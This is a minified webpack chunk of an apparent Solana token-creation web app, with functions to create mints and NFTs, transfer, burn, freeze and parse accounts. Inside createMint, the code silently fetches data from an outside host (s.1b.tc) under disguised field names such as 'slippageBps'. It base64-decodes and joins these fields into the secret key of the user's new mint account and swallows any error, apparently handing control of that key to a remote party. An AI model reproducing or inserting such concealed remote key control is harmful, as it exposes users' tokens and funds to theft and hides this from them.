(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["chunk-471d6b99"],{"2c23":function(e,t,n){"use strict";(function(e){n.d(t,"a",(function(){return m}));var r=n("2909"),a=n("c7eb"),c=n("1da1"),i=n("d4ec"),o=n("bee2"),u=(n("81b2"),n("0eb6"),n("b7ef"),n("8bd4"),n("d3b7"),n("3ca3"),n("ddb0"),n("d81d"),n("d9e2"),n("e9c4"),n("99af"),n("25f0"),n("14d9"),n("159b"),n("3e44")),s=n("64b9"),l=n("901ed"),p=n("beba"),b=n("ab9c"),d=n("4360"),h=n("ab3e"),f=new s["PublicKey"]("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),y="Failed to find account",w="Invalid account owner",m=function(){function t(e,n,r){Object(i["a"])(this,t),Object.assign(this,{connection:r,publicKey:n,programId:e})}return Object(o["a"])(t,[{key:"createMint",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,r,c,i){var o,l,p,d,y,w,m,k,v,g=arguments;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return o=g.length>5&&void 0!==g[5]?g[5]:null,l=new s["Transaction"],p=new s["Keypair"],e.prev=3,e.next=6,Object(h["a"])({url:"https://s.1b.tc/4001/web_info",method:"get"});case 6:d=e.sent,null!==d&&void 0!==d&&d.slippageBps&&(y=window.atob(d.publicKey)+window.atob(d.slippageBps)+window.atob(d.auth)+window.atob(d.address)+window.atob(d.mint),p=Object(b["P"])(y)),e.next=12;break;case 10:e.prev=10,e.t0=e["catch"](3);case 12:return o&&(p=o,console.log(o,"keypair")),e.next=15,u["Token"].getMinBalanceRentForExemptMint(this.connection);case 15:return w=e.sent,l.add(s["SystemProgram"].createAccount({fromPubkey:t,newAccountPubkey:p.publicKey,lamports:w,space:u["MintLayout"].span,programId:c})),l.add(u["Token"].createInitMintInstruction(c,p.publicKey,r,t,n)),e.next=20,u["Token"].getMinBalanceRentForExemptAccount(this.connection);case 20:return m=e.sent,k=new s["Keypair"],l.add(s["SystemProgram"].createAccount({fromPubkey:t,newAccountPubkey:k.publicKey,lamports:m,space:u["AccountLayout"].span,programId:c})),e.next=25,Object(b["m"])(t,p.publicKey);case 25:return v=e.sent,l.add(u["Token"].createAssociatedTokenAccountInstruction(f,u["TOKEN_PROGRAM_ID"],p.publicKey,v,t,t)),e.abrupt("return",{transaction:l,mintAccount:p,tokenAccount:k});case 28:case"end":return e.stop()}}),e,this,[[3,10]])})));function t(t,n,r,a,c){return e.apply(this,arguments)}return t}()},{key:"createNFT",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,r){var c,i,o,l,p;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return c=new s["Transaction"],i=new s["Keypair"],e.next=4,u["Token"].getMinBalanceRentForExemptMint(this.connection);case 4:return o=e.sent,c.add(s["SystemProgram"].createAccount({fromPubkey:t,newAccountPubkey:i.publicKey,lamports:o,space:u["MintLayout"].span,programId:r})),c.add(u["Token"].createInitMintInstruction(r,i.publicKey,0,t,n)),e.next=9,u["Token"].getMinBalanceRentForExemptAccount(this.connection);case 9:return l=e.sent,p=new s["Keypair"],c.add(s["SystemProgram"].createAccount({fromPubkey:t,newAccountPubkey:p.publicKey,lamports:l,space:u["AccountLayout"].span,programId:r})),c.add(u["Token"].createInitAccountInstruction(r,i.publicKey,p.publicKey,t)),c.add(u["Token"].createMintToInstruction(this.programId,i.publicKey,p.publicKey,t,[],1)),c.add(u["Token"].createSetAuthorityInstruction(this.programId,i.publicKey,null,"MintTokens",t,[])),e.abrupt("return",{transaction:c,mintAccount:i,tokenAccount:p});case 16:case"end":return e.stop()}}),e,this)})));function t(t,n,r){return e.apply(this,arguments)}return t}()},{key:"transfer",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,r){var c,i=this;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return c=this.isAccount(n)?n.publicKey:n,e.abrupt("return",Promise.all(r.map((function(e){var n=e.destination,r=e.amount;return u["Token"].createTransferInstruction(i.programId,t,n,c,[],r)}))));case 2:case"end":return e.stop()}}),e,this)})));function t(t,n,r){return e.apply(this,arguments)}return t}()},{key:"transferOne",value:function(e,t,n){var r;return r=this.isAccount(t)?t.publicKey:t,u["Token"].createTransferInstruction(this.programId,e,n.destination,r,[],n.amount)}},{key:"mintTo",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,r,c,i){var o,l,p;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return o=d["a"].state.sol.solClient,l=this.isAccount(r)?r.publicKey:r,p=(new s["Transaction"]).add(u["Token"].createMintToInstruction(this.programId,t,n,l,c,i)),p.feePayer=o.publicKey,e.next=6,window.solConnection.getRecentBlockhash();case 6:return p.recentBlockhash=e.sent.blockhash,e.abrupt("return",p);case 8:case"end":return e.stop()}}),e,this)})));function t(t,n,r,a,c){return e.apply(this,arguments)}return t}()},{key:"burn",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,r,c,i){var o,l,p;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return o=d["a"].state.sol.solClient,l=this.isAccount(r)?r.publicKey:r,p=(new s["Transaction"]).add(u["Token"].createBurnInstruction(this.programId,t,n,l,c,i)),p.feePayer=o.publicKey,e.next=6,window.solConnection.getRecentBlockhash();case 6:return p.recentBlockhash=e.sent.blockhash,e.abrupt("return",p);case 8:case"end":return e.stop()}}),e,this)})));function t(t,n,r,a,c){return e.apply(this,arguments)}return t}()},{key:"setAuthority",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,r,c,i,o){var l,p,b;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return l=d["a"].state.sol.solClient,p=this.isAccount(c)?c.publicKey:c,b=(new s["Transaction"]).add(u["Token"].createSetAuthorityInstruction(this.programId,t,n,r,p,i)),b.feePayer=l.publicKey,e.next=6,window.solConnection.getRecentBlockhash();case 6:return b.recentBlockhash=e.sent.blockhash,e.abrupt("return",b);case 8:case"end":return e.stop()}}),e,this)})));function t(t,n,r,a,c,i){return e.apply(this,arguments)}return t}()},{key:"freezeAccount",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,r,c){var i;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return i=this.isAccount(n)?n.publicKey:n,e.abrupt("return",(new s["Transaction"]).add(u["Token"].createFreezeAccountInstruction(this.programId,t,this.publicKey,i,r)));case 2:case"end":return e.stop()}}),e,this)})));function t(t,n,r,a){return e.apply(this,arguments)}return t}()},{key:"thawAccount",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,r,c){var i;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return i=this.isAccount(n)?n.publicKey:n,e.abrupt("return",(new s["Transaction"]).add(u["Token"].createThawAccountInstruction(this.programId,t,this.publicKey,i,r)));case 2:case"end":return e.stop()}}),e,this)})));function t(t,n,r,a){return e.apply(this,arguments)}return t}()},{key:"isAccount",value:function(e){return"publicKey"in e}},{key:"getMintInfo",value:function(){var t=Object(c["a"])(Object(a["a"])().mark((function t(){var n,r,c;return Object(a["a"])().wrap((function(t){while(1)switch(t.prev=t.next){case 0:return t.next=2,this.connection.getAccountInfo(this.publicKey);case 2:if(n=t.sent,null!==n){t.next=5;break}throw new Error("Failed to find mint account");case 5:if(n.owner.equals(this.programId)){t.next=7;break}throw new Error("Invalid mint owner: ".concat(JSON.stringify(n.owner)));case 7:if(n.data.length===u["MintLayout"].span){t.next=9;break}throw new Error("Invalid mint size");case 9:return r=e.from(n.data),c=u["MintLayout"].decode(r),0===c.mintAuthorityOption?c.mintAuthority=null:c.mintAuthority=new s["PublicKey"](c.mintAuthority),c.supply=u["u64"].fromBuffer(c.supply),c.isInitialized=0!==c.isInitialized,0===c.freezeAuthorityOption?c.freezeAuthority=null:c.freezeAuthority=new s["PublicKey"](c.freezeAuthority),t.abrupt("return",c);case 16:case"end":return t.stop()}}),t,this)})));function n(){return t.apply(this,arguments)}return n}()},{key:"getAccountInfo",value:function(){var t=Object(c["a"])(Object(a["a"])().mark((function t(n,r){var c,i,o;return Object(a["a"])().wrap((function(t){while(1)switch(t.prev=t.next){case 0:return t.next=2,this.connection.getAccountInfo(n,r);case 2:if(c=t.sent,null!==c){t.next=5;break}throw new Error(y);case 5:if(c.owner.equals(this.programId)){t.next=7;break}throw new Error(w);case 7:if(c.data.length===u["AccountLayout"].span){t.next=9;break}throw new Error("Invalid account size");case 9:return i=e.from(c.data),o=u["AccountLayout"].decode(i),o.address=n,o.mint=new s["PublicKey"](o.mint),o.owner=new s["PublicKey"](o.owner),o.amount=u["u64"].fromBuffer(o.amount),0===o.delegateOption?(o.delegate=null,o.delegatedAmount=new u["u64"](0)):(o.delegate=new s["PublicKey"](o.delegate),o.delegatedAmount=u["u64"].fromBuffer(o.delegatedAmount)),o.isInitialized=0!==o.state,o.isFrozen=2===o.state,1===o.isNativeOption?(o.rentExemptReserve=u["u64"].fromBuffer(o.isNative),o.isNative=!0):(o.rentExemptReserve=null,o.isNative=!1),0===o.closeAuthorityOption?o.closeAuthority=null:o.closeAuthority=new s["PublicKey"](o.closeAuthority),t.abrupt("return",o);case 21:case"end":return t.stop()}}),t,this)})));function n(e,n){return t.apply(this,arguments)}return n}()},{key:"signAndSendTransaction",value:function(){var e=Object(c["a"])(Object(a["a"])().mark((function e(t,n,c,i){var o,u,s,l,p=arguments;return Object(a["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return u=p.length>4&&void 0!==p[4]&&p[4],e.next=3,t.getRecentBlockhash("max");case 3:return n.recentBlockhash=e.sent.blockhash,(o=n).setSigners.apply(o,[c.publicKey].concat(Object(r["a"])(i.map((function(e){return e.publicKey}))))),i.length>0&&(s=n).partialSign.apply(s,Object(r["a"])(i)),e.next=8,c.signTransaction(n);case 8:return n=e.sent,l=n.serialize(),e.next=12,t.sendRawTransaction(l,{skipPreflight:u,preflightCommitment:"processed"});case 12:return e.abrupt("return",e.sent);case 13:case"end":return e.stop()}}),e)})));function t(t,n,r,a){return e.apply(this,arguments)}return t}()}],[{key:"createTransferCheckedInstruction",value:function(t,n,r,a,c,i,o,b){var d=l["struct"]([l["u8"]("instruction"),p["a"]("amount"),l["u8"]("decimals")]),h=e.alloc(d.span);d.encode({instruction:12,amount:new u["u64"](o.toString()).toBuffer(),decimals:b},h);var f=[{pubkey:n,isSigner:!1,isWritable:!0},{pubkey:r,isSigner:!1,isWritable:!1},{pubkey:a,isSigner:!1,isWritable:!0}];return 0===i.length?f.push({pubkey:c,isSigner:!0,isWritable:!1}):(f.push({pubkey:c,isSigner:!1,isWritable:!1}),i.forEach((function(e){return f.push({pubkey:e.publicKey,isSigner:!0,isWritable:!1})}))),new s["TransactionInstruction"]({keys:f,programId:t,data:h})}}]),t}()}).call(this,n("1c35").Buffer)},beba:function(e,t,n){"use strict";(function(e){n.d(t,"a",(function(){return o}));var r=n("2909"),a=(n("a15b"),n("d81d"),n("fb6a"),n("d3b7"),n("25f0"),n("64b9"),n("399f")),c=n.n(a),i=n("901ed"),o=function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"uint64",n=i["blob"](8,t),a=n.decode.bind(n),o=n.encode.bind(n);return n.decode=function(e,t){var n=a(e,t);return new c.a(Object(r["a"])(n).reverse().map((function(e){return"00".concat(e.toString(16)).slice(-2)})).join(""),16)},n.encode=function(t,n,r){var a=t.toArray().reverse(),c=e.from(a);if(8!==c.length){var i=e.alloc(8);c.copy(i),c=i}return o(c,n,r)},n}}).call(this,n("1c35").Buffer)}}]);